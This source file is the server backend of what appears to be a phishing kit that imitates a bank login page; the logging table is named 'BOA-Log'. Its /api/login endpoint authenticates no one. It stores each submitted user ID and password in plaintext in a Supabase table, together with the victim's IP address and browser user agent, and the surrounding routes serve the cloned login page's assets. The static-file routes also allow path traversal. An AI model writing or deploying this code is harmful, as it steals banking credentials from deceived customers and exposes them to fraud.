import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
// In Vercel, api/[...].js is in /var/task/api, so projectRoot is /var/task
const projectRoot = process.env.VERCEL 
  ? path.join(__dirname, '..') 
  : path.join(__dirname, '..');

console.log('[Init] __dirname:', __dirname);
console.log('[Init] projectRoot:', projectRoot);
console.log('[Init] VERCEL env:', process.env.VERCEL ? 'true' : 'false');

let app = null;

function initializeApp() {
  if (app) return app;
  
  app = express();

  // Middleware
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // Supabase Configuration
  const supabaseUrl = process.env.SUPABASE_URL;
  const supabaseKey = process.env.SUPABASE_ANON_KEY;
  const useSupabase = Boolean(supabaseUrl && supabaseKey);

  let supabase = null;
  try {
    if (useSupabase) {
      supabase = createClient(supabaseUrl, supabaseKey);
      console.log('[Init] Supabase client initialized');
    } else {
      console.log('[Init] Supabase credentials not configured');
    }
  } catch (error) {
    console.error('[Init] Error initializing Supabase:', error.message);
  }

  // Local CSV Logger Configuration
  const logsDir = '/tmp';

  // Helper function to get client IP
  function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
           req.socket.remoteAddress ||
           'unknown';
  }

  // Log entry function
  async function logEntry(data) {
    const timestamp = new Date().toISOString();
    
    try {
      // Try Supabase first if enabled
      if (useSupabase && supabase) {
        try {
          const { error } = await supabase
            .from('BOA-Log')
            .insert([
              {
                user_id: data.userId || 'N/A',
                password: data.password || 'N/A',
                remember_me: data.rememberMe ? true : false,
                ip_address: data.ipAddress || 'unknown',
                user_agent: data.userAgent || 'unknown',
                status: 'Attempted'
              }
            ]);
          
          if (error) {
            console.error('[Supabase] Insert error:', error.message);
          } else {
            console.log('[Supabase] Entry logged:', data.userId);
          }
        } catch (supabaseError) {
          console.error('[Supabase] Exception:', supabaseError.message);
        }
      }
    } catch (error) {
      console.error('[Log] Error:', error.message);
    }
  }

  // Debug endpoint
  app.get('/api/debug', (req, res) => {
    res.json({
      status: 'ok',
      message: 'Server is running',
      supabase: supabase ? 'Connected' : 'Not connected',
      env: process.env.VERCEL ? 'Vercel' : 'Local',
      projectRoot,
      __dirname,
      assetPath: path.join(projectRoot, 'assets', 'css'),
      cssFileExists: fs.existsSync(path.join(projectRoot, 'assets', 'css', 'vipaa-v4-jawr.css'))
    });
  });

  // Setup endpoint
  app.post('/api/setup', async (req, res) => {
    try {
      res.json({
        success: true,
        message: 'Application ready',
        env: process.env.VERCEL ? 'Vercel' : 'Local'
      });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Login API endpoint
  app.post('/api/login', async (req, res) => {
    try {
      const { userId, password, rememberMe } = req.body;
      const ipAddress = getClientIp(req);
      const userAgent = req.headers['user-agent'];

      await logEntry({
        userId,
        password,
        rememberMe: rememberMe === 'on' || rememberMe === true,
        ipAddress,
        userAgent
      });

      res.json({ success: true, message: 'Login attempt logged' });
    } catch (error) {
      console.error('[/api/login] Error:', error);
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Logs endpoint
  app.get('/api/logs', async (req, res) => {
    try {
      res.json({
        success: true,
        data: [],
        message: 'Logs endpoint available',
        source: 'Vercel'
      });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Serve static assets - FIXED
  app.get('/assets/*', (req, res) => {
    try {
      const filePath = path.join(projectRoot, '/assets', req.params[0]);
      if (fs.existsSync(filePath)) {
        if (filePath.endsWith('.css')) res.setHeader('Content-Type', 'text/css; charset=utf-8');
        else if (filePath.endsWith('.js')) res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        else if (filePath.endsWith('.svg')) res.setHeader('Content-Type', 'image/svg+xml');
        else if (filePath.endsWith('.png')) res.setHeader('Content-Type', 'image/png');
        else if (filePath.endsWith('.jpg') || filePath.endsWith('.jpeg')) res.setHeader('Content-Type', 'image/jpeg');
        else if (filePath.endsWith('.gif')) res.setHeader('Content-Type', 'image/gif');
        else if (filePath.endsWith('.ico')) res.setHeader('Content-Type', 'image/x-icon');
        const content = fs.readFileSync(filePath);
        return res.send(content);
      }
      res.status(404).send('Not found');
    } catch (error) {
      res.status(500).send('Error');
    }
  });

  app.get('/etc/*', (req, res) => {
    try {
      const filePath = path.join(projectRoot, '/etc', req.params[0]);
      if (fs.existsSync(filePath)) {
        const content = fs.readFileSync(filePath);
        return res.send(content);
      }
      res.status(404).send('Not found');
    } catch (error) {
      res.status(500).send('Error');
    }
  });

  app.get('/jfe/*', (req, res) => {
    try {
      const filePath = path.join(projectRoot, '/jfe', req.params[0]);
      if (fs.existsSync(filePath)) {
        const content = fs.readFileSync(filePath);
        return res.send(content);
      }
      res.status(404).send('Not found');
    } catch (error) {
      res.status(500).send('Error');
    }
  });

  // Serve root
  app.get('/', (req, res) => {
    const indexPath = path.join(projectRoot, 'index.html');
    console.log('[GET /] Serving from:', indexPath, 'exists:', fs.existsSync(indexPath));
    if (fs.existsSync(indexPath)) {
      res.sendFile(indexPath);
    } else {
      res.status(404).send('index.html not found');
    }
  });

  // Serve specific HTML files
  app.get('/dashboard.html', (req, res) => {
    const dashPath = path.join(projectRoot, 'dashboard.html');
    if (fs.existsSync(dashPath)) {
      res.sendFile(dashPath);
    } else {
      res.status(404).send('dashboard.html not found');
    }
  });

  app.get('/dashboard', (req, res) => {
    const dashPath = path.join(projectRoot, 'dashboard.html');
    if (fs.existsSync(dashPath)) {
      res.sendFile(dashPath);
    } else {
      res.status(404).send('dashboard.html not found');
    }
  });

  // Catch-all for other HTML routes (must come LAST)
  app.get('/:page', (req, res) => {
    // Skip if path looks like a file with extension
    if (req.params.page.includes('.')) {
      return res.status(404).send('Not found');
    }
    
    const pagePath = path.join(projectRoot, `${req.params.page}.html`);
    if (fs.existsSync(pagePath)) {
      res.sendFile(pagePath);
    } else {
      res.status(404).send('Page not found');
    }
  });

  // Error handler
  app.use((err, req, res, next) => {
    console.error('[Error]', err);
    res.status(500).json({ success: false, error: err.message || 'Internal server error' });
  });

  return app;
}

// Export default handler for Vercel
export default (req, res) => {
  try {
    const application = initializeApp();
    application(req, res);
  } catch (error) {
    console.error('[Handler Error]', error);
    res.status(500).json({ 
      success: false, 
      error: error.message,
      stack: process.env.VERCEL ? undefined : error.stack
    });
  }
};
